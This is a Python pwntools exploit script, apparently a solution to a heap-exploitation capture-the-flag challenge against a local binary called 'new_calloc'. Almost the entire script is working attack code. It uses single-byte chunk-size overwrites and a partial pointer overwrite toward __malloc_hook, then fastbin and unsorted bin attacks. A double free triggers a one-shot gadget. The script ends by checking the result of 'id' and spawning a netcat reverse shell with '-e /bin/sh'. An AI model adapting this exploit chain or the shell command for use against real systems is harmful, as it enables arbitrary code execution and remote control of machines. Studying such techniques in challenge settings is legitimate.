#!/usr/bin/python
from pwn import *

p = process("/home/ubuntu/defcon-cfp-hor/new_calloc")
#raw_input()

def menu():
	p.recvuntil("3. Free")

def create(size):
	menu()
	p.sendline("1")
	p.recvuntil(":")
	p.sendline(str(size))

def free(idx):
	menu()
	p.sendline("3")
	p.recvuntil(":")
	p.sendline(str(idx))

def edit(idx,data):
	menu()
	p.sendline("2")
	p.recvuntil(":")
	p.sendline(str(idx))
	sleep(0.1)
	p.send(data)

create(248)		# 0

create(134)		# 1
create(101)		# 2

fake = "B"*104
fake += p64(0x21)
edit(1,fake)

free(1)
buf = "A"*248
buf += "\x9f"
edit(0,buf)

create(134)		# 1
create(134)		# 3 <-- victim.

buf = "C"*248
buf += "\x71"
edit(0,buf)

#edit(3,"\xcd\x4a")	# Heap overwrite to __malloc_hook.
edit(3,"\xed\x4a")	# Heap overwrite to __malloc_hook.

# Setup FD freelist.
create(24)		# 4
create(24)		# 5
create(101)		# 6
create(24)		# 7

lol = "D"*24
lol += "\x91"
edit(4,lol)
free(5)

create(134)		# 5
revive = "X"*24
revive += p64(0x71)
edit(5,revive)

free(2)
free(6)

revive = "X"*24
revive += p64(0x71)
revive += "\x00"
edit(5,revive)

# Prepare Unsorted Bin.
create(24)		# 2
create(24)		# 6
create(200)		# 8
create(24)		# 9
create(24)		# 10

lol = "F"*24
lol += "\xf1"
edit(2,lol)

free(6)
create(232)		# 6

fake = "Y"*24
fake += p64(0xd1)
edit(6,fake)

free(8)

fake = "Z"*24
fake += p64(0xd1)
fake += "ZZZZZZZZ\x00\x4b"
edit(6,fake)

# Trigger fastbin attack first.
create(101)		# 8
create(101)		# 11
create(101)		# 12

# Trigger unsorted bin attack now.
create(200)

# be02a4
over = "R"*19
over += "\xa4\x02\xbe"
edit(12,over)

# Double free to trigger magic gadget.
free(3)
free(11)

try:
	resp = p.recv(4, timeout=6)
	p.clean()
	p.sendline("id")
	if "groups=1000" in p.recv():
		p.sendline("nc 127.0.0.1 2000 -e \"/bin/sh\"")
		p.interactive()
	else:
		p.close()
except:
	p.close()
